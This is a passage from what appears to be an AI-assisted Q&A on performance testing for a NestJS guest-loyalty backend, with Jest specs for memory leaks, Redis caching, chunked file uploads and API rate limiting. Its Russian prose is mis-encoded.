    writeHeapSnapshot(snapshotBefore);
    console.log(`Heap snapshot saved: ${snapshotBefore}`);

    let iteration = 0;

    while (Date.now() - startTime < duration) {
      // Simulate realistic workload
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${getMockToken()}`)
        .expect(200);

      iteration++;

      // Measure every 5 minutes
      if (iteration % 300 === 0) {
        if (global.gc) global.gc();
        await new Promise(resolve => setTimeout(resolve, 1000));

        const memory = process.memoryUsage();
        const elapsed = (Date.now() - startTime) / 1000 / 60; // minutes

        measurements.push({
          elapsed: elapsed.toFixed(1),
          heapUsed: (memory.heapUsed / 1024 / 1024).toFixed(2),
          heapTotal: (memory.heapTotal / 1024 / 1024).toFixed(2),
          rss: (memory.rss / 1024 / 1024).toFixed(2),
        });

        console.log(`${elapsed.toFixed(0)}min: Heap ${(memory.heapUsed / 1024 / 1024).toFixed(2)} MB`);
      }

      // Small delay to simulate real traffic
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    // Take heap snapshot after
    const snapshotAfter = path.join(__dirname, 'heap-after.heapsnapshot');
    writeHeapSnapshot(snapshotAfter);
    console.log(`Heap snapshot saved: ${snapshotAfter}`);

    // Analyze measurements
    console.log('=== Soak Test Results ===');
    console.table(measurements);

    const initialHeap = parseFloat(measurements[0].heapUsed);
    const finalHeap = parseFloat(measurements[measurements.length - 1].heapUsed);
    const growth = finalHeap - initialHeap;

    console.log(`Memory growth over 1 hour: ${growth.toFixed(2)} MB`);

    // Should not grow more than 200MB in 1 hour
    expect(growth).toBeLessThan(200);

    console.log('\nTo analyze heap snapshots:');
    console.log('1. Open Chrome DevTools');
    console.log('2. Go to Memory tab');
    console.log(`3. Load ${snapshotBefore}`);
    console.log(`4. Load ${snapshotAfter}`);
    console.log('5. Compare snapshots to find leaks');
  });

  // Test 4: Heap Snapshot Comparison
  it('should compare heap snapshots programmatically', async () => {
    jest.setTimeout(60000);

    // Take snapshot 1
    if (global.gc) global.gc();
    const snapshot1 = v8.writeHeapSnapshot();

    // Run workload
    for (let i = 0; i < 1000; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);
    }

    // Take snapshot 2
    if (global.gc) global.gc();
    const snapshot2 = v8.writeHeapSnapshot();

    // Compare snapshots
    const diff = compareHeapSnapshots(snapshot1, snapshot2);

    console.log('=== Heap Snapshot Comparison ===');
    console.log(`Objects retained: ${diff.retainedObjects}`);
    console.log(`Memory retained: ${diff.retainedMemory} bytes`);
    console.log('Top retainers:');
    console.table(diff.topRetainers.slice(0, 10));

    // Cleanup
    fs.unlinkSync(snapshot1);
    fs.unlinkSync(snapshot2);
  });

  // Test 5: Specific Leak Scenarios
  describe('common leak patterns', () => {
    it('should not leak event listeners', async () => {
      const { EventEmitter } = require('events');
      const emitter = new EventEmitter();

      const initialListeners = emitter.listenerCount('test');

      // Add and remove listeners
      for (let i = 0; i < 1000; i++) {
        const listener = () => {};
        emitter.on('test', listener);
        emitter.off('test', listener);
      }

      const finalListeners = emitter.listenerCount('test');

      expect(finalListeners).toBe(initialListeners); // No leak
    });

    it('should not leak database connections', async () => {
      const prisma = app.get(PrismaClient);

      const initialConnections = await getActiveConnections();

      // Run many queries
      for (let i = 0; i < 100; i++) {
        await prisma.user.findMany({ take: 10 });
      }

      await new Promise(resolve => setTimeout(resolve, 1000));

      const finalConnections = await getActiveConnections();

      expect(finalConnections).toBeLessThanOrEqual(initialConnections + 2);
    });

    it('should not leak timers', async () => {
      const activeTimers = () => process._getActiveHandles().filter(h => h.constructor.name === 'Timeout').length;

      const initialTimers = activeTimers();

      // Create and clear timers
      for (let i = 0; i < 1000; i++) {
        const timer = setTimeout(() => {}, 10000);
        clearTimeout(timer);
      }

      const finalTimers = activeTimers();

      expect(finalTimers).toBeLessThanOrEqual(initialTimers + 5);
    });
  });
});

// Helper functions
function calculateGrowthRate(measurements: any[]): number {
  if (measurements.length < 2) return 0;

  // Simple linear regression
  const n = measurements.length;
  let sumX = 0, sumY = 0, sumXY = 0, sumX2 = 0;

  measurements.forEach(m => {
    sumX += m.iteration;
    sumY += m.heapUsed;
    sumXY += m.iteration * m.heapUsed;
    sumX2 += m.iteration * m.iteration;
  });

  const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
  return slope;
}

function compareHeapSnapshots(snapshot1: string, snapshot2: string): any {
  // Simplified comparison (in real use, use heapsnapshot-parser library)
  const fs = require('fs');
  
  const s1 = JSON.parse(fs.readFileSync(snapshot1, 'utf8'));
  const s2 = JSON.parse(fs.readFileSync(snapshot2, 'utf8'));

  return {
    retainedObjects: s2.nodes.length - s1.nodes.length,
    retainedMemory: s2.snapshot.total_size - s1.snapshot.total_size,
    topRetainers: [],
  };
}

async function getActiveConnections(): Promise<number> {
  const prisma = app.get(PrismaClient);
  const result = await prisma.$queryRaw<[{ count: bigint }]>`
    SELECT COUNT(*) as count FROM pg_stat_activity WHERE datname = current_database();
  `;
  return Number(result[0].count);
}

function getMockToken(): string {
  return jwt.sign({ userId: 'user-1', role: 'GUEST' }, process.env.JWT_SECRET);
}
```

**Run with GC enabled:**

```json
{
  "scripts": {
    "test:memory": "node --expose-gc --max-old-space-size=2048 node_modules/.bin/jest --testMatch='**/*.perf.spec.ts' --runInBand"
  }
}
```


***

ะัะพะดะพะปะถะฐั ั ะฒะพะฟัะพัะฐะผะธ **26-30** (ะพััะฐะปัะฝัะต Load \& Performance)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **26. Cache Effectiveness - hit rate?**

**ะะพะฝัะตะบัั:** Redis cache ะดะปั guest cards, loyalty rules.

**ะะพะฟัะพั:** Performance test?

- A) Query ะฑะตะท cache โ measure latency
- B) Query ั cache โ measure latency (should be faster)
- C) B + ะฟัะพะฒะตัะธัั cache hit rate (> 80%)
- D) C + simulate cache eviction (ะฟัะพะฒะตัะธัั ััะพ ะฝะต ะฟะฐะดะฐะตั)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Cache hit rate ะบัะธัะธัะตะฝ ะดะปั performance (80%+ = ัะพัะพัะพ)
- Cache eviction = ัะตะฐะปัะฝัะน ััะตะฝะฐัะธะน (Redis restart, memory limit)
- Graceful degradation ะฟัะธ cache miss ะพะฑัะทะฐัะตะปะตะฝ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/cache-effectiveness.perf.spec.ts
import { Redis } from 'ioredis';

describe('Cache Effectiveness - Performance Testing', () => {
  let app: INestApplication;
  let redis: Redis;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
    prisma = app.get(PrismaClient);

    // Seed test data
    await seedTestData();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await redis.flushall(); // Clear cache
  });

  // Test 1: Baseline (no cache)
  it('should measure query latency without cache', async () => {
    const iterations = 100;
    const durations: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();

      await prisma.guestCard.findUnique({
        where: { id: 'card-1' },
        include: {
          user: {
            include: { guestProfile: true },
          },
          loyaltyLevel: true,
        },
      });

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const p95 = durations.sort((a, b) => a - b)[Math.floor(durations.length * 0.95)];

    console.log('=== Without Cache ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`p95: ${p95.toFixed(2)}ms`);

    // Baseline performance (direct DB query)
    expect(avgDuration).toBeGreaterThan(10); // Should take some time
  });

  // Test 2: With Cache
  it('should measure query latency with cache', async () => {
    const guestCardService = app.get(GuestCardService);
    const iterations = 100;
    const durations: number[] = [];

    // Prime cache
    await guestCardService.findById('card-1');

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();

      await guestCardService.findById('card-1'); // Uses cache

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const p95 = durations.sort((a, b) => a - b)[Math.floor(durations.length * 0.95)];

    console.log('=== With Cache ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`p95: ${p95.toFixed(2)}ms`);

    // Cache should be much faster
    expect(avgDuration).toBeLessThan(5); // < 5ms from cache
  });

  // Test 3: Cache Hit Rate
  it('should achieve > 80% cache hit rate', async () => {
    const guestCardService = app.get(GuestCardService);

    let hits = 0;
    let misses = 0;

    // Simulate realistic access pattern (Zipf distribution)
    const cardIds = Array(100).fill(null).map((_, i) => `card-${i}`);
    const requests = 1000;

    for (let i = 0; i < requests; i++) {
      // Zipf distribution: 20% of cards get 80% of traffic
      const cardId = zipfDistribution(cardIds);

      const cacheKey = `guest_card:${cardId}`;
      const cached = await redis.get(cacheKey);

      if (cached) {
        hits++;
        await guestCardService.findById(cardId);
      } else {
        misses++;
        await guestCardService.findById(cardId);
      }
    }

    const hitRate = (hits / requests) * 100;

    console.log('=== Cache Hit Rate ===');
    console.log(`Requests: ${requests}`);
    console.log(`Hits: ${hits}`);
    console.log(`Misses: ${misses}`);
    console.log(`Hit Rate: ${hitRate.toFixed(2)}%`);

    expect(hitRate).toBeGreaterThan(80); // > 80% hit rate
  });

  // Test 4: Cache Eviction (LRU policy)
  it('should handle cache eviction gracefully', async () => {
    const guestCardService = app.get(GuestCardService);

    // Set low max memory for Redis (simulate memory pressure)
    await redis.config('SET', 'maxmemory', '10mb');
    await redis.config('SET', 'maxmemory-policy', 'allkeys-lru');

    const durations: number[] = [];

    // Fill cache with 1000 cards
    for (let i = 0; i < 1000; i++) {
      await redis.set(
        `guest_card:card-${i}`,
        JSON.stringify({ id: `card-${i}`, data: 'x'.repeat(10000) }), // 10KB per entry
        'EX',
        3600
      );
    }

    // Access cards (some will be evicted)
    for (let i = 0; i < 100; i++) {
      const startTime = performance.now();

      await guestCardService.findById(`card-${i}`);

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const p95 = durations.sort((a, b) => a - b)[Math.floor(durations.length * 0.95)];

    console.log('=== With Cache Eviction ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`p95: ${p95.toFixed(2)}ms`);

    // Should still perform reasonably (falls back to DB)
    expect(p95).toBeLessThan(50); // p95 < 50ms

    // Reset Redis config
    await redis.config('SET', 'maxmemory', '0');
  });

  // Test 5: Cache Invalidation Performance
  it('should invalidate cache efficiently', async () => {
    const guestCardService = app.get(GuestCardService);

    // Prime cache for 1000 cards
    const cardIds = Array(1000).fill(null).map((_, i) => `card-${i}`);
    
    for (const cardId of cardIds) {
      await guestCardService.findById(cardId);
    }

    const startTime = performance.now();

    // Invalidate all cards for tenant-1
    await redis.keys('guest_card:*').then(keys => {
      if (keys.length > 0) {
        return redis.del(...keys);
      }
    });

    const duration = performance.now() - startTime;

    console.log('=== Cache Invalidation ===');
    console.log(`Invalidated 1000 keys in ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(100); // < 100ms
  });

  // Test 6: Cache Stampede Prevention
  it('should prevent cache stampede', async () => {
    const guestCardService = app.get(GuestCardService);

    // Clear cache
    await redis.del('guest_card:card-1');

    let dbQueryCount = 0;

    // Mock Prisma to count DB queries
    const originalFindUnique = prisma.guestCard.findUnique;
    prisma.guestCard.findUnique = jest.fn(async (...args) => {
      dbQueryCount++;
      await new Promise(resolve => setTimeout(resolve, 100)); // Simulate slow query
      return originalFindUnique.apply(prisma.guestCard, args);
    });

    // Simulate 100 concurrent requests (cache miss)
    const promises = Array(100).fill(null).map(() =>
      guestCardService.findById('card-1')
    );

    await Promise.all(promises);

    console.log('=== Cache Stampede Test ===');
    console.log(`DB queries: ${dbQueryCount}`);

    // Should only query DB once (other requests wait for cache)
    expect(dbQueryCount).toBe(1);

    // Restore original function
    prisma.guestCard.findUnique = originalFindUnique;
  });

  // Test 7: Cache Warming
  it('should warm cache efficiently on startup', async () => {
    const startTime = performance.now();

    // Warm cache for top 100 most accessed cards
    const topCards = await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      orderBy: { lastActivityAt: 'desc' },
      take: 100,
    });

    const pipeline = redis.pipeline();
    
    for (const card of topCards) {
      pipeline.set(
        `guest_card:${card.id}`,
        JSON.stringify(card),
        'EX',
        3600
      );
    }

    await pipeline.exec();

    const duration = performance.now() - startTime;

    console.log('=== Cache Warming ===');
    console.log(`Warmed 100 cards in ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(1000); // < 1s
  });

  // Test 8: Multi-level Cache
  it('should test multi-level cache (L1: memory, L2: Redis)', async () => {
    const NodeCache = require('node-cache');
    const l1Cache = new NodeCache({ stdTTL: 60 }); // L1: in-memory

    const iterations = 1000;
    let l1Hits = 0;
    let l2Hits = 0;
    let dbQueries = 0;

    for (let i = 0; i < iterations; i++) {
      const cardId = zipfDistribution(['card-1', 'card-2', 'card-3', 'card-4', 'card-5']);

      // Check L1 cache (memory)
      let card = l1Cache.get(cardId);
      if (card) {
        l1Hits++;
        continue;
      }

      // Check L2 cache (Redis)
      card = await redis.get(`guest_card:${cardId}`);
      if (card) {
        l2Hits++;
        l1Cache.set(cardId, card); // Promote to L1
        continue;
      }

      // Query DB
      dbQueries++;
      card = await prisma.guestCard.findUnique({ where: { id: cardId } });
      
      // Cache in both levels
      await redis.set(`guest_card:${cardId}`, JSON.stringify(card), 'EX', 3600);
      l1Cache.set(cardId, card);
    }

    const l1HitRate = (l1Hits / iterations) * 100;
    const l2HitRate = (l2Hits / iterations) * 100;
    const totalHitRate = ((l1Hits + l2Hits) / iterations) * 100;

    console.log('=== Multi-level Cache ===');
    console.log(`L1 hits: ${l1Hits} (${l1HitRate.toFixed(2)}%)`);
    console.log(`L2 hits: ${l2Hits} (${l2HitRate.toFixed(2)}%)`);
    console.log(`DB queries: ${dbQueries} (${((dbQueries / iterations) * 100).toFixed(2)}%)`);
    console.log(`Total hit rate: ${totalHitRate.toFixed(2)}%`);

    expect(totalHitRate).toBeGreaterThan(90); // > 90% combined hit rate
  });

  // Test 9: Cache Metrics Collection
  it('should collect cache metrics', async () => {
    const guestCardService = app.get(GuestCardService);

    // Run workload
    for (let i = 0; i < 500; i++) {
      const cardId = zipfDistribution(['card-1', 'card-2', 'card-3', 'card-4', 'card-5']);
      await guestCardService.findById(cardId);
    }

    // Get Redis stats
    const info = await redis.info('stats');
    const lines = info.split('\r\n');
    
    const stats: any = {};
    for (const line of lines) {
      const [key, value] = line.split(':');
      if (key && value) {
        stats[key] = value;
      }
    }

    console.log('=== Redis Stats ===');
    console.log(`Total connections: ${stats.total_connections_received}`);
    console.log(`Total commands: ${stats.total_commands_processed}`);
    console.log(`Keyspace hits: ${stats.keyspace_hits}`);
    console.log(`Keyspace misses: ${stats.keyspace_misses}`);
    
    const hitRate = (parseInt(stats.keyspace_hits) / 
      (parseInt(stats.keyspace_hits) + parseInt(stats.keyspace_misses))) * 100;
    
    console.log(`Hit rate: ${hitRate.toFixed(2)}%`);

    expect(hitRate).toBeGreaterThan(70);
  });
});

// Helper functions
function zipfDistribution(items: string[]): string {
  // Zipf distribution: 20% of items get 80% of traffic
  const rank = Math.floor(Math.pow(Math.random(), 2) * items.length);
  return items[rank];
}

async function seedTestData() {
  const prisma = app.get(PrismaClient);
  
  // Create 100 test guest cards
  for (let i = 0; i < 100; i++) {
    await prisma.guestCard.create({
      data: {
        id: `card-${i}`,
        userId: `user-${i}`,
        tenantId: 'tenant-1',
        totalBalance: Math.floor(Math.random() * 5000),
        qrCode: `qr-${i}`,
        displayCode: String(i).padStart(6, '0'),
        status: 'ACTIVE',
        lastActivityAt: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
      },
    });
  }
}
```


***

### **27. File Upload Performance - chunked uploads?**

**ะะพะฝัะตะบัั:** Admin ะทะฐะณััะถะฐะตั CSV (10MB) ั ััะฐะฝะทะฐะบัะธัะผะธ.

**ะะพะฟัะพั:** Performance test?

- A) Upload 1MB file โ success
- B) Upload 10MB file โ ะฟัะพะฒะตัะธัั chunked upload
- C) B + Upload 100MB file โ ะฟัะพะฒะตัะธัั limits
- D) C + concurrent uploads (10 users ะพะดะฝะพะฒัะตะผะตะฝะฝะพ)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Chunked uploads ะบัะธัะธัะฝั ะดะปั ะฑะพะปััะธั ัะฐะนะปะพะฒ (> 10MB)
- File size limits ะฟัะตะดะพัะฒัะฐัะฐัั abuse
- Concurrent uploads = realistic scenario

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/file-upload.perf.spec.ts
import { createReadStream, createWriteStream, writeFileSync } from 'fs';
import { join } from 'path';
import FormData from 'form-data';

describe('File Upload Performance', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Small File (1MB)
  it('should upload 1MB file quickly', async () => {
    const filePath = generateTestFile(1); // 1MB
    const token = generateAdminToken();

    const form = new FormData();
    form.append('file', createReadStream(filePath));

    const startTime = performance.now();

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/pos/import-csv')
      .set('Authorization', `Bearer ${token}`)
      .set(form.getHeaders())
      .attach('file', filePath)
      .expect(200);

    const duration = performance.now() - startTime;

    console.log('=== 1MB File Upload ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Throughput: ${(1 / (duration / 1000)).toFixed(2)} MB/s`);

    expect(duration).toBeLessThan(2000); // < 2s

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 2: Medium File (10MB) - Chunked Upload
  it('should upload 10MB file with chunking', async () => {
    const filePath = generateTestFile(10); // 10MB
    const token = generateAdminToken();

    const fileSize = fs.statSync(filePath).size;
    const chunkSize = 1024 * 1024; // 1MB chunks
    const totalChunks = Math.ceil(fileSize / chunkSize);

    console.log('=== 10MB File Upload (Chunked) ===');
    console.log(`File size: ${fileSize} bytes`);
    console.log(`Chunk size: ${chunkSize} bytes`);
    console.log(`Total chunks: ${totalChunks}`);

    const startTime = performance.now();
    const uploadId = `upload-${Date.now()}`;

    // Upload chunks
    for (let i = 0; i < totalChunks; i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('Content-Type', 'application/octet-stream')
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk)
        .expect(200);

      console.log(`Uploaded chunk ${i + 1}/${totalChunks}`);
    }

    // Finalize upload
    await request(app.getHttpServer())
      .post('/api/v1/admin/upload/finalize')
      .set('Authorization', `Bearer ${token}`)
      .send({ uploadId, totalChunks })
      .expect(200);

    const duration = performance.now() - startTime;
    const throughput = (fileSize / 1024 / 1024) / (duration / 1000);

    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} MB/s`);

    expect(duration).toBeLessThan(15000); // < 15s

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 3: Large File (100MB) - Size Limit
  it('should enforce 100MB file size limit', async () => {
    const filePath = generateTestFile(101); // 101MB (exceeds limit)
    const token = generateAdminToken();

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/pos/import-csv')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(413); // Payload Too Large

    expect(response.body.message).toContain('File size exceeds limit');

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 4: Concurrent Uploads (10 users)
  it('should handle 10 concurrent file uploads', async () => {
    jest.setTimeout(60000);

    const uploadCount = 10;
    const fileSize = 5; // 5MB each

    console.log('=== Concurrent Uploads ===');
    console.log(`Users: ${uploadCount}`);
    console.log(`File size: ${fileSize}MB each`);

    const startTime = performance.now();

    const promises = Array(uploadCount).fill(null).map(async (_, i) => {
      const filePath = generateTestFile(fileSize);
      const token = generateAdminToken();

      const uploadStart = performance.now();

      await request(app.getHttpServer())
        .post('/api/v1/admin/pos/import-csv')
        .set('Authorization', `Bearer ${token}`)
        .attach('file', filePath)
        .expect(200);

      const uploadDuration = performance.now() - uploadStart;

      // Cleanup
      fs.unlinkSync(filePath);

      return uploadDuration;
    });

    const durations = await Promise.all(promises);
    const totalDuration = performance.now() - startTime;

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const maxDuration = Math.max(...durations);

    console.log(`Total duration: ${totalDuration.toFixed(2)}ms`);
    console.log(`Avg per upload: ${avgDuration.toFixed(2)}ms`);
    console.log(`Max per upload: ${maxDuration.toFixed(2)}ms`);

    expect(totalDuration).toBeLessThan(30000); // < 30s total
    expect(maxDuration).toBeLessThan(20000); // < 20s per upload
  });

  // Test 5: Upload Progress Tracking
  it('should track upload progress', async () => {
    const filePath = generateTestFile(10); // 10MB
    const token = generateAdminToken();
    const uploadId = `upload-${Date.now()}`;

    const fileSize = fs.statSync(filePath).size;
    const chunkSize = 1024 * 1024; // 1MB
    const totalChunks = Math.ceil(fileSize / chunkSize);

    const progressUpdates: number[] = [];

    for (let i = 0; i < totalChunks; i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk);

      // Get progress
      const progressResponse = await request(app.getHttpServer())
        .get(`/api/v1/admin/upload/${uploadId}/progress`)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      progressUpdates.push(progressResponse.body.progress);
    }

    console.log('=== Upload Progress ===');
    console.log(`Progress updates: ${progressUpdates.join('% โ ')}%`);

    expect(progressUpdates[progressUpdates.length - 1]).toBe(100);

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 6: Resumable Upload (connection interrupted)
  it('should resume interrupted upload', async () => {
    const filePath = generateTestFile(10); // 10MB
    const token = generateAdminToken();
    const uploadId = `upload-${Date.now()}`;

    const fileSize = fs.statSync(filePath).size;
    const chunkSize = 1024 * 1024;
    const totalChunks = Math.ceil(fileSize / chunkSize);

    // Upload first half
    for (let i = 0; i < Math.floor(totalChunks / 2); i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk);
    }

    console.log('Upload interrupted...');

    // Check which chunks are uploaded
    const statusResponse = await request(app.getHttpServer())
      .get(`/api/v1/admin/upload/${uploadId}/status`)
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const uploadedChunks = statusResponse.body.uploadedChunks;
    console.log(`Uploaded chunks: ${uploadedChunks.join(', ')}`);

    // Resume upload (upload remaining chunks)
    for (let i = Math.floor(totalChunks / 2); i < totalChunks; i++) {
      const start = i * chunkSize;
      const end = Math.min(start + chunkSize, fileSize);
      const chunk = fs.readFileSync(filePath).slice(start, end);

      await request(app.getHttpServer())
        .post('/api/v1/admin/upload/chunk')
        .set('Authorization', `Bearer ${token}`)
        .set('X-Upload-Id', uploadId)
        .set('X-Chunk-Index', String(i))
        .set('X-Total-Chunks', String(totalChunks))
        .send(chunk);
    }

    // Finalize
    await request(app.getHttpServer())
      .post('/api/v1/admin/upload/finalize')
      .set('Authorization', `Bearer ${token}`)
      .send({ uploadId, totalChunks })
      .expect(200);

    console.log('Upload resumed and completed');

    // Cleanup
    fs.unlinkSync(filePath);
  });

  // Test 7: Virus Scan Performance
  it('should scan uploaded file for viruses', async () => {
    const filePath = generateTestFile(5); // 5MB
    const token = generateAdminToken();

    const startTime = performance.now();

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/pos/import-csv')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    const duration = performance.now() - startTime;

    console.log('=== File Upload with Virus Scan ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Virus scan result: ${response.body.virusScanResult}`);

    expect(response.body.virusScanResult).toBe('clean');
    expect(duration).toBeLessThan(10000); // < 10s including scan

    // Cleanup
    fs.unlinkSync(filePath);
  });
});

// Helper functions
function generateTestFile(sizeMB: number): string {
  const filePath = join(__dirname, `test-file-${sizeMB}mb.csv`);
  const chunkSize = 1024 * 1024; // 1MB
  const totalChunks = sizeMB;

  const stream = createWriteStream(filePath);

  for (let i = 0; i < totalChunks; i++) {
    // Generate CSV data
    const data = Array(10000).fill(null).map((_, j) => 
      `CHK-${i}-${j},2026-02-12,+79991234567,${Math.floor(Math.random() * 10000)}\n`
    ).join('');

    stream.write(data);
  }

  stream.end();

  return filePath;
}

function generateAdminToken(): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

ะัะพะดะพะปะถะฐั ั ะฟะพัะปะตะดะฝะธะผะธ 3 ะฒะพะฟัะพัะฐะผะธ (28-30) Load \& Performance, ะฟะพัะพะผ ะฟะตัะตัะพะดะธะผ ะบ Security Testing? ๐

---

# ะฟัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **28. API Rate Limiting - ะทะฐัะธัะฐ ะพั abuse?**

**ะะพะฝัะตะบัั:** Rate limit = 100 requests/min per tenant.

**ะะพะฟัะพั:** Load test?

- A) Send 50 requests โ all succeed
- B) Send 100 requests โ all succeed
- C) Send 150 requests โ 50 ะดะพะปะถะฝั ะฒะตัะฝััั 429 Too Many Requests
- D) C + ะฟัะพะฒะตัะธัั ััะพ rate limit reset ัะตัะตะท 1 ะผะธะฝััั

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Rate limiting ะบัะธัะธัะตะฝ ะดะปั ะทะฐัะธัั ะพั abuse
- 429 errors ะดะพะปะถะฝั ะฒะพะทะฒัะฐัะฐัััั ะบะพััะตะบัะฝะพ
- Reset window ะดะพะปะถะตะฝ ัะฐะฑะพัะฐัั ัะพัะฝะพ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/rate-limiting.perf.spec.ts
describe('API Rate Limiting - Performance Testing', () => {
  let app: INestApplication;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await redis.flushall(); // Clear rate limit counters
  });

  // Test 1: Under Rate Limit (50 requests)
  it('should allow 50 requests (under limit)', async () => {
    const token = generateGuestToken('tenant-1');
    let successCount = 0;
    let errorCount = 0;

    for (let i = 0; i < 50; i++) {
      const response = await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429) {
        errorCount++;
      }
    }

    console.log('=== Under Rate Limit (50 requests) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${errorCount}`);

    expect(successCount).toBe(50);
    expect(errorCount).toBe(0);
  });

  // Test 2: At Rate Limit (100 requests)
  it('should allow exactly 100 requests', async () => {
    const token = generateGuestToken('tenant-1');
    let successCount = 0;
    let errorCount = 0;

    for (let i = 0; i < 100; i++) {
      const response = await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429) {
        errorCount++;
      }
    }

    console.log('=== At Rate Limit (100 requests) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${errorCount}`);

    expect(successCount).toBe(100);
    expect(errorCount).toBe(0);
  });

  // Test 3: Exceed Rate Limit (150 requests)
  it('should rate limit after 100 requests', async () => {
    const token = generateGuestToken('tenant-1');
    let successCount = 0;
    let rateLimitedCount = 0;

    for (let i = 0; i < 150; i++) {
      const response = await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);

      if (response.status === 200) {
        successCount++;
      } else if (response.status === 429) {
        rateLimitedCount++;

        // Check rate limit headers
        expect(response.headers['x-ratelimit-limit']).toBe('100');
        expect(response.headers['x-ratelimit-remaining']).toBe('0');
        expect(response.headers['x-ratelimit-reset']).toBeDefined();
        expect(response.headers['retry-after']).toBeDefined();
      }
    }

    console.log('=== Exceed Rate Limit (150 requests) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${rateLimitedCount}`);

    expect(successCount).toBe(100);
    expect(rateLimitedCount).toBe(50);
  });

  // Test 4: Rate Limit Reset After 1 Minute
  it('should reset rate limit after 1 minute', async () => {
    jest.setTimeout(90000); // 90 seconds

    const token = generateGuestToken('tenant-1');

    // Use up rate limit
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    }

    // Next request should be rate limited
    await request(app.getHttpServer())
